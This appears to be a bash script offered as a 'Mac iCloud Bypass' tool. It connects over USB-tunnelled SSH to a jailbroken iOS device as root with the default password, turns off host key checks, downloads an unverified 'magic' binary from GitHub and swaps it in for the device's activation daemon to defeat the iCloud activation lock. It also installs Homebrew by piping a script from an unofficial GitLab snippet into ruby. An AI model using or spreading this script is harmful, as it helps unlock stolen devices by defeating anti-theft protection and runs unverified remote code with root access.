#!/bin/bash

function scp(){
echo
echo
echo "==> Copying MagicFiles..."
echo
sshpass -p alpine scp -o StrictHostKeyChecking=no -P 2222 ~/magic root@localhost:/var/h/mobileactivationd
}

function bypass(){
echo
echo
echo "==> Bypassing now..."
echo
runcmd () {
    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2222 "$1" > /dev/null
}
echo
echo
echo "==> Bypassing iCloud lock..."
echo
runcmd "mount -o rw,union,update / && cd /usr/libexec && mv /var/h/mobileactivationd /usr/libexec/mobileactivationd && chmod +x /usr/libexec/mobileactivationd && launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist && launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist && exit"
}

echo "==> Checking for brew..."

which brew > /dev/null
if [ $? -ne 0 ]; then
    echo "==> You do not have Homebrew installed on your Mac."
    read -p "==> Homebrew is required to use this tool. Press enter/return to automatically install it... "
    /usr/bin/ruby -e "$(curl -fsSL https://gitlab.com/snippets/1909941/raw)"
fi

echo "==> Installing dependencies..."
brew install libusbmuxd
brew install libimobiledevice
brew install hudochenkov/sshpass/sshpass
brew install wget

clear
echo "**************** Mac iCloud Bypass ****************"
echo
echo "=> By ThemobileStore:"
echo
echo
echo "==> Setting up SSH over USB..."
echo
iproxy 2222 44 2> /dev/null &

runcmd () {
    sshpass -p alpine ssh -o StrictHostKeyChecking=no root@localhost -p 2222 "$1" > /dev/null
}

echo "==> Setting up files..."
echo
runcmd "mount -o rw,union,update / && mv /usr/libexec/mobileactivationd /usr/libexec/oldmobile && mkdir /var/h && exit"

wget -q -X "~/magic" https://raw.githubusercontent.com/tausift0/Mac/main/magic

scp

bypass

rm -f ~/magic

echo
echo "==> Done! :)"
